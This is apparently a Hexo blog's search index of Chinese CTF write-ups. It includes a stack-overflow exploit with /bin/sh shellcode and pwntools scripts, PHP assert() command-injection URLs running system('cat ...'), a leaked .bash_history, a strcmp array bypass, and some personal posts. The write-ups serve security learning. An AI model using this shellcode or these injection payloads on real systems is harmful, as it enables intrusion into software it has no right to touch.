<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title><![CDATA[babypwn3学习经历]]></title>
      <url>/2017/12/30/babypwn3%E5%AD%A6%E4%B9%A0%E7%BB%8F%E5%8E%86/</url>
      <content type="html"><![CDATA[<p>&lt; !–more–&gt;<br>一:查壳<br>checksec babypwn3<br>显示：</p>
<p><img src="/2017/12/30/babypwn3学习经历/01.png" alt=""></p>
<p>没有什么保护<br>二：代码<br>int vulFunc()<br>{<br>char buf; // [sp+0h] [bp-88h]@1<br>char v2; // [sp+7Fh] [bp-9h]@1<br>memset(&amp;buf, 0, 0x80u); //初始化buf的128个字节为0 ①<br>puts(“寮勬淇轰亢涔熶笉浼氬惉浣犵殑璇濈殑锛乗n”);<br>read(0, &amp;buf, 0x100u); //读取数据256个字节保存在buf中<br>if ( v2 == 127 )<br>JUMPOUT(CS, &amp;buf); //当v2=127时会去执行栈上的代码<br>return puts(“鐣ョ暐鐣ワ綖\n”);<br>}<br>.text:080484A6 ; =============== S U B R O U T I N E =======================================<br>.text:080484A6<br>.text:080484A6 ; Attributes: bp-based frame<br>.text:080484A6<br>.text:080484A6 public vulFunc<br>.text:080484A6 vulFunc proc near ; CODE XREF: main+46p<br>.text:080484A6<br>.text:080484A6 buf = byte ptr -88h<br>.text:080484A6 var_9 = byte ptr -9<br>.text:080484A6<br>……<br>.text:08048500 jmp esp<br>三：<br>需要一个shellcode能够system(“/bin/sh”)<br>shellcode=”\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80”; //感恩师傅，我可以偷懒<br>1.shellcode+任意字符*(127-shellcode长度)+(v2=127)<br>覆盖v2=127，需要用p32()打包<br>from pwn import<br>shellcode = “\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80”;<br>p=remote(‘121.42.189.18 ‘,7003)<br>payload = shellcode+’a’(127-len(shellcode))+p32(127)<br>p.recv()<br>p.sendline(payload)<br>raw_input()<br>p.interactive()<br>2.”jmp esp”作为跳板动态定位shellcode③<br>因为当Eip在后续执行过程中，遇到了jmp esp指令，仍会回到esp指向的函数形参位置执行，执行shellcode的剩余部分。<br>jmp sep地址=08048500 ，需要用p32()打包<br>from pwn import<br>shellcode = “\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80”;<br>p=remote(‘121.42.189.18 ‘,7003)<br>jmp_esp=0x8048500<br>payload = ‘a’140+p32(jmp_esp)+shellcode<br>p.recv()<br>p.sendline(payload)<br>p.interactive()<br>四：进入shell里<br>cat /tmp/flag ⑤<br>①memset() 函数常用于内存空间初始化<br>void memset(void s,int c,size_t n)<br>开辟的空间s的n个字符初始化为c<br>②JumpOut (“Program” [, “Document”])<br>program:指定的应用程序打开文件Document<br>③可用”jmp esp”作为跳板动态定位shellcode<br>1) 用内存中任意一个”jmp esp”的地址覆盖返回地址<br>2) 函数返回后被重定向去执行内存中jmp esp指令<br>3) 由于函数返回后ESP指向返回地址后，jmp esp执行后，CPU将到栈区函数返回地址之后的地方取指令执行<br>4) shellcode的布置。缓冲区前面一段用任意数据填充，把shellcode放在函数返回地址后面。jmp esp执行完就执行shellcode。<br><a href="http://blog.csdn.net/lixiangminghate/article/details/53333710（栈的图画得非常好）" target="_blank" rel="noopener">http://blog.csdn.net/lixiangminghate/article/details/53333710（栈的图画得非常好）</a><br><a href="http://blog.csdn.net/swjtu100/article/details/50032831（exploit画得很好看）" target="_blank" rel="noopener">http://blog.csdn.net/swjtu100/article/details/50032831（exploit画得很好看）</a><br>栈指针esp的一个特性：当函数执行ret指令后，Eip寄存器发生了跳转，但Esp还指向函数形参在栈中的地址。<br>当Eip在后续执行过程中，遇到了jmp esp指令，仍会回到esp指向的函数形参位置执行，执行shellcode的剩余部分。<br>④flag{g54dwqdqw-f43csad-saDWqd23wdasxsaxdFDWEVC}</p>
]]></content>
      
        
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[俄罗斯方块（GG）]]></title>
      <url>/2017/12/30/%E4%BF%84%E7%BD%97%E6%96%AF%E6%96%B9%E5%9D%97%EF%BC%88GG%EF%BC%89/</url>
      <content type="html"><![CDATA[<p>&lt; !–more–&gt;<br>①查看元素<br>有一个tetris.js的文件<br>②在线代码美化<br>根据题目分数大于1000000分<br>偷懒查找score</p>
<p><img src="/2017/12/30/俄罗斯方块（GG）/01.png" alt=""><br>③发现有个 “webqwer” [1] + “100.js”<br>webqwer[1]就是e<br>④<a href="http://218.76.35.75:65380/e100.js" target="_blank" rel="noopener">http://218.76.35.75:65380/e100.js</a><br>又是[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]这种代码<br>⑤在控制台复制粘贴加执行<br>跳出对话框，里面有flag</p>
<p><img src="/2017/12/30/俄罗斯方块（GG）/02.png" alt=""></p>
<p>flag{oT0yTrjU0xhjhj2YTcT8jljMWpzS9tDk}</p>
]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[南邮综合题]]></title>
      <url>/2017/12/30/%E5%8D%97%E9%82%AE%E7%BB%BC%E5%90%88%E9%A2%98/</url>
      <content type="html"><![CDATA[<p>&lt; !–more–&gt;<br>1、打开网页是 jother编码 </p>
<p><img src="/2017/12/30/南邮综合题/01.png" alt=""></p>
<p>*jother编码：JavaScript是一种属于网络的脚本语言,已经被广泛用于Web应用开发,常用来为网页添加各式各样的动态功能,为用户提供更流畅美观的浏览效果。<br>通常JavaScript脚本是通过嵌入在HTML中来实现自身的功能的jother是另类的javascript工具<br>一堆+!的东西就用jother解码<br>可以打开谷歌浏览器 按F12<br>然后console将那堆解码的东西复制过去 按回车即可解码<br>2、在谷歌浏览器中的console中复制粘贴代码，回车解码<br>得到1bc29b36f623ba82aaf6724fd3b16718.php<br>将<a href="http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/index.php" target="_blank" rel="noopener">http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/index.php</a><br>改成<br><a href="http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/1bc29b36f623ba82aaf6724fd3b16718.php" target="_blank" rel="noopener">http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/1bc29b36f623ba82aaf6724fd3b16718.php</a></p>
<p><img src="/2017/12/30/南邮综合题/02.png" alt=""></p>
<p>显示：哈哈哈哈哈哈你上当啦，这里什么都没有，TIP在我脑袋里<br>(▼へ▼メ)<br>给了提示，要看tip<br>3、当前页面<br><a href="http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/1bc29b36f623ba82aaf6724fd3b16718.php" target="_blank" rel="noopener">http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/1bc29b36f623ba82aaf6724fd3b16718.php</a><br>查看tip（在network里的headers里查看有个history of bash）</p>
<p>*history of bash：默认情况下，历史命令是存储在~/.bash_history文件里</p>
<p><img src="/2017/12/30/南邮综合题/04.png" alt=""></p>
<p>4、找/.bash_histroy文件<br><a href="http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/.bash_history" target="_blank" rel="noopener">http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/.bash_history</a><br>找到一个压缩包zip -r flagbak.zip ./*</p>
<p><img src="/2017/12/30/南邮综合题/05.png" alt=""></p>
<p>用URL=<a href="http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/flagbak.zip" target="_blank" rel="noopener">http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/flagbak.zip</a><br>自动下载，下载完解压找到flag<br>flag is:nctf{bash_history_means_what}</p>
]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[babyphp]]></title>
      <url>/2017/12/30/babyphp/</url>
      <content type="html"><![CDATA[<p>&lt; !–more–&gt;<br>1、查看源码：</p>
<p><img src="/2017/12/30/babyphp/01.png" alt=""></p>
<p>可以发现一共有三个page：home，about，contact<br>还有一个可能存在的page：flag.php<br>2、<a href="http://web.jarvisoj.com:32798/?page=flag.php" target="_blank" rel="noopener">http://web.jarvisoj.com:32798/?page=flag.php</a><br>显示：That file doesn’t exist!<br>3、查看about里面有：PHP，GIT,Bootstrap<br>可能有源码泄露，联系到about中有Git，使用GitHack下载源码<br>4、使用GitHash下载源码方法：<br>cmd，并切换到已经下载GitHash-master的py文件目录下<br>python GitHash.py url.git<br>python GitHash.py <a href="http://web.jarvisoj.com:32798/.git" target="_blank" rel="noopener">http://web.jarvisoj.com:32798/.git</a></p>
<p><img src="/2017/12/30/babyphp/02.png" alt=""></p>
<p>显示有index.php，about.php，contact.php，flag.php，home.php<br>在GitHash-master的目录下可以找到一个web.jarvisoj.com_32798的文件夹<br>里面有templates和index.php文件<br>*Templates文件夹：该文件夹中存储着常用程序的模板文件，如winword.doc、powerpnt.ppt、excel.xls等。<br>模板就是包含有段落结构、字体样式和页面布局等元素的样式。<br>它决定了文档的基本结构和设置的样式。<br>5、查看了flag.php：<br>&lt;?php<br>// TODO<br>//$FLAG = ‘’;<br>?&gt;<br>6、最后查看index.php：<br>&lt;?php<br>if (isset($_GET[‘page’])){</p>
<p>$page = $_GET[‘page’];<br>}<br>else {<br>$page = “home”;<br>}<br>$file = “templates/“ . $page . “.php”;<br>assert(“strpos(‘$file’, ‘..’) === false”) or die(“Detected hacking attempt!”);<br>assert(“file_exists(‘$file’)”) or die(“That file doesn’t exist!”);<br>?&gt;<br>/<em>PHP assert()<br>assert — 检查一个断言是否为 FALSE<br>PHP 5<br>bool assert ( mixed $assertion [, string $description ] )<br>PHP 7<br>bool assert ( mixed $assertion [, Throwable $exception ] )<br>assert() 会检查指定的 assertion 并在结果为 FALSE 时采取适当的行动。<br>如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。<br>assertion 是字符串的优势是当禁用断言时它的开销会更小，并且在断言失败时消息会包含 assertion 表达式。<br>这意味着如果你传入了 boolean 的条件作为 assertion，这个条件将不会显示为断言函数的参数；<br>在调用你定义的 assert_options() 处理函数时，条件会转换为字符串，而布尔值 FALSE 会被转换成空字符串。<br>断言这个功能应该只被用来调试。<br>你应该用于完整性检查时测试条件是否始终应该为 TRUE，来指示某些程序错误，或者检查具体功能的存在（类似扩展函数或特定的系统限制和功能）。<br>断言不应该用于普通运行时操作，类似输入参数的检查。<br>作为一个经验法则，在断言禁用时你的代码也应该能够正确地运行。<br>assert() 的行为可以通过 assert_options() 来配置，或者手册页面上描述的 .ini 设置。<br>assert_options() ASSERT_CALLBACK 配置指令允许设置回调函数来处理失败的断言。<br>assert() 回调函数在构建自动测试套件的时候尤其有用，因为它们允许你简易地捕获传入断言的代码，并包含断言的位置信息。 当信息能够被其他方法捕获，使用断言可以让它更快更方便！</em>/<br>其实真看不懂什么意思 ψ(._.)&gt; 谁来教我<br>php中assert本来是用于调试的，如果assert方法内的代码不为true，则给个Warning提醒。<br>如下面的代码：<br>&lt;?php assert(‘1==2’); ?&gt;<br>执行后会有如下输出： Warning: assert(): Assertion “1==2” failed in D:\green\APMServ5.2.6\www\htdocs\phpinfo.php on line 2 有个assert_option方法可以对assert进行一些控制。<br>7、构造assert()函数会运行接收的语句</p>
<p><1><a href="http://web.jarvisoj.com:32798/?page=flag&#39;.system(&quot;ls" target="_blank" rel="noopener">http://web.jarvisoj.com:32798/?page=flag&#39;.system(&quot;ls</a> templates/;”).’<br>显示：about.phpcontact.phpflag.phphome.phpabout.phpcontact.phpflag.phphome.phpThat file doesn’t exist!</1></p>
<p><2><a href="http://web.jarvisoj.com:32798/?page=&#39;,&#39;..&#39;)===False" target="_blank" rel="noopener">http://web.jarvisoj.com:32798/?page=&#39;,&#39;..&#39;)===False</a> and system(‘cat templates/flag.php’);//<br>显示：<br>&lt;?php<br>// TODO<br>//$FLAG = ‘61dctf{8e_careful_when_us1ng_ass4rt}’;<br>?&gt;<br>That file doesn’t exist!<br>‘,’..’)===False根据assert(“strpos(‘$file’, ‘..’) === false”) or die(“Detected hacking attempt!”)<br>‘,’..’)===False为真<br>system(‘cat templates/flag.php’)<br>显示flag.php的内容<br>*system()函数<br>system — 执行外部程序，并且显示输出<br>string system ( string $command [, int &amp;$return_var ] )<br>参数<br>command<br>要执行的命令。<br>return_var<br>如果提供 return_var 参数， 则外部命令执行后的返回状态将会被设置到此变量中。<br>返回值<br>成功则返回命令输出的最后一行， 失败则返回 FALSE<br>FLAG = ‘61dctf{8e_careful_when_us1ng_ass4rt}</2></p>
]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[checkpass]]></title>
      <url>/2017/12/30/checkpass/</url>
      <content type="html"><![CDATA[<p>&lt; !–more–&gt;<br>查看源码<br>&lt;?php<br>$pass=@$_POST[‘pass’];<br>$pass1=<em>;//被隐藏起来的密码<br>if(isset($pass))<br>{<br>if(@!strcmp($pass,$pass1)){<br>echo “flag:nctf{</em>}”;<br>}else{<br>echo “the pass is wrong!”;<br>}<br>}else{<br>echo “please input pass!”;<br>}<br>?&gt;<br>php的strcmp函数，传入一个array就好了<br>strcmp()函数在PHP官方手册中的描述是int strcmp ( string str1,stringstr2 ),需要给strcmp()传递2个string类型的参数。如果str1小于str2,返回-1，相等返回0，否则返回1。strcmp函数比较字符串的本质是将两个变量转换为ascii，然后进行减法运算，然后根据运算结果来决定返回值。<br>如果传入给出strcmp()的参数是数字呢？<br>$array=[1,2,3];<br>var_dump(strcmp($array,’123’)); //null,在某种意义上null也就是相当于false。<br><a href="http://chinalover.sinaapp.com/web21/" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web21/</a><br>使用hackbar插件<br>load URL：<a href="http://chinalover.sinaapp.com/web21/index.php" target="_blank" rel="noopener">http://chinalover.sinaapp.com/web21/index.php</a><br>post data：pass[]=1 //传入一个数组</p>
]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[在命令行里运行python脚本]]></title>
      <url>/2017/12/30/%E5%9C%A8%E5%91%BD%E4%BB%A4%E8%A1%8C%E9%87%8C%E8%BF%90%E8%A1%8Cpython%E8%84%9A%E6%9C%AC/</url>
      <content type="html"><![CDATA[<p>&lt; !–more–&gt;<br>打开文本编辑器，notepad<br>语言设置成python<br>脚本第一行一定要写上 #! /usr/bin/env python<br>编辑好之后，将文件保存成 .py格式<br>cd 到运行文件所在目录<br>运行python 文件名.py<br>cmd命令行中输入 python<br>把脚本文件拖拽到当前光标位置，回车<br>报错：<br>File ““ , line 1<br>python hello.py<br>SyntaxError：invalid synta<br>原因：Python命令行中，运行Python代码<br>“python hello.py”是一个脚本命令，不是python代码</p>
]]></content>
      
        
        <tags>
            
            <tag> python </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[感慨一下恢复的历程]]></title>
      <url>/2017/12/30/%E6%84%9F%E6%85%A8%E4%B8%80%E4%B8%8B%E6%81%A2%E5%A4%8D%E7%9A%84%E5%8E%86%E7%A8%8B/</url>
      <content type="html"><![CDATA[<p>因为硬盘坏了之前的本地文件都没了<br>作为一个啥也不懂得小白痴百度好像没有直接的办法<br>然后尝试地打算换个新账号重新来一波<br>但是后来不知咋的<br>找到了一个hexo-git-backup<br>但是我好像真的不太会使啊<br>&lt;。。。。。开始玩起消消乐&gt;<br>莫名把之前的内容从自己网站上复制了下来<br>&lt;不小心漏了一篇T^T&gt;<br>然后又照着各位大佬换电脑备份这个的经验教训<br>然后又开始配置啥啥啥的<br>&lt;省略心酸一大把&gt;<br>然后就可以开始换个高大上的主题<br>最后开始把复制下来的重新整理部署上去</p>
<p>纪念这个硬盘坏了的2017，再见~</p>
<p><img src="/2017/12/30/感慨一下恢复的历程/02.jpg" alt=""><br><img src="/2017/12/30/感慨一下恢复的历程/07.jpg" alt=""><br><img src="/2017/12/30/感慨一下恢复的历程/04.jpg" alt=""><br><img src="/2017/12/30/感慨一下恢复的历程/03.jpg" alt=""><br><img src="/2017/12/30/感慨一下恢复的历程/05.jpg" alt=""><br>沉迷王权、月初cp</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[Hello World]]></title>
      <url>/2017/12/30/hello-world/</url>
      <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
]]></content>
      
        
    </entry>
    
  
  
</search>
